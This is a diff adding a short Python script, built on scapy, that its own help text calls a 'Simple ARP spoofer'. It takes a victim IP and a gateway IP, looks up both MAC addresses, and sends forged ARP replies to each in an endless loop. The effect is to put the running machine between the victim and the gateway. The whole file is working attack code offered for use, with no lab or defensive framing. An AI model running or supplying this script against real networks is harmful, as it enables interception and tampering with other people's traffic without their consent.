@@ -1,0 +1,49 @@
+#!/usr/bin/python3.8
+
+import scapy.all as scapy
+import subprocess
+import argparse
+import time
+import re
+
+def get_args():
+	parser = argparse.ArgumentParser(description='Simple ARP spoofer!')
+	parser.add_argument('-v','--victim_ip',dest='victim_ip',help='IP of the victim')
+	parser.add_argument('-g','--gateway_ip',dest='gateway_ip',help='IP of the gateway')
+	
+	args = parser.parse_args()
+	
+	if not args.victim_ip and not args.gateway_ip:
+		parser.error('Please enter victim IP and gateway IP!')
+	elif not args.victim_ip:
+		parser.error('Please enter the victim IP!')
+	elif not args.gateway_ip:
+		parser.error('Please enter the gateway IP!')
+
+	return args
+
+def get_mac(ip):
+	arp_req = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether()
+	packet = broadcast/arp_req
+	ans = scapy.srp(packet,timeout=1,verbose=False)[0]
+	return ans[0][1].hwsrc
+
+def packet_spoof(sent_to_ip,spoof_ip,spoof_mac):
+	packet = scapy.ARP(op=2,psrc=spoof_ip,pdst=sent_to_ip,hwdst=spoof_mac)
+	return packet
+
+def arp_attack(packet1,packet2):
+	while True:
+		scapy.send(packet1)
+		scapy.send(packet2)
+		time.sleep(2)
+		
+args = get_args()
+victim_ip = args.victim_ip
+gateway_ip = args.gateway_ip
+victim_mac = get_mac(victim_ip)
+gateway_mac = get_mac(gateway_ip)
+packet1 = packet_spoof(victim_ip,gateway_ip,victim_mac)
+packet2 = packet_spoof(gateway_ip,victim_ip,gateway_mac)
+arp_attack(packet1,packet2)
